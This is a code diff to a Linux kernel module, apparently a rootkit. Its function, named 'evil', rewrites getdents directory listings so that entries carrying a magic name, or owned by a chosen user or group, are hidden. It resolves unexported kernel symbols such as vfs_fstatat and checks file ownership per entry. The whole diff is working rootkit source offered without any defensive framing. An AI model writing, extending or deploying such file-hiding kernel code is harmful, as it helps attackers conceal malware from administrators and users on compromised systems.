@@ -26,7 +26,10 @@ struct linux_dirent {
 int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {    
     int err;
 	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+    struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
+    int user;
+    int group;
+	struct linux_dirent64 *dir, *kdir, *kdirent, *prev = NULL;
 
     kdirent = kzalloc(res, GFP_KERNEL);
 	if (kdirent == NULL){
@@ -40,36 +43,32 @@ int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {
 		goto out;
     }
 
-    int (*vfs_fstat_ptr)(int, struct kstat *) = (int (*)(int,  struct kstat *))lookup_name("vfs_fstat");
+    int (*vfs_fstatat_ptr)(int, const char __user *, struct kstat *, int) = (int (*)(int, const char __user *, struct kstat *, int))lookup_name("vfs_fstatat");
 
-    struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
-    int user;
-    int group;
-    err = vfs_fstat_ptr(fd, stat);
-    if (err){
-        printk(KERN_DEBUG "can not read file attributes!\n");
-		goto out;
-    }
-    user = (int)stat->uid.val;
-    group = (int)stat->gid.val;
-    kfree(stat);
-
-    printk(KERN_DEBUG "%s belongs to %i:%i!\n", dir->d_name, user, group);
+    printk(KERN_DEBUG "vfs_fstatat_ptr is at %lx\n", vfs_fstatat_ptr);
 
 	while (off < res) {
-		dir = (void *)kdirent + off;
-		if (strstr(dir->d_name, MAGIC_WORD)
+		kdir = (void *)kdirent + off;
+        dir = (void *)dirent + off;
+        err = vfs_fstatat_ptr(fd, dir->d_name, stat, 0);
+        if (err){
+            printk(KERN_DEBUG "can not read file attributes!\n");
+		    goto out;
+        }
+        user = (int)stat->uid.val;
+        group = (int)stat->gid.val;
+		if (strstr(kdir->d_name, MAGIC_WORD)
             || user == USER_HIDE
             || group == GROUP_HIDE) {
-			if (dir == kdirent) {
-				res -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, res);
+			if (kdir == kdirent) {
+				res -= kdir->d_reclen;
+				memmove(kdir, (void *)kdir + kdir->d_reclen, res);
 				continue;
 			}
-			prev->d_reclen += dir->d_reclen;
+			prev->d_reclen += kdir->d_reclen;
 		} else
-			prev = dir;
-		off += dir->d_reclen;
+			prev = kdir;
+		off += kdir->d_reclen;
 	}
 	err = copy_to_user(dirent, kdirent, res);
 	if (err){
@@ -77,6 +76,7 @@ int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {
 		goto out;
     }
     out:
+        kfree(stat);
 	    kfree(kdirent);
     return res;
 }
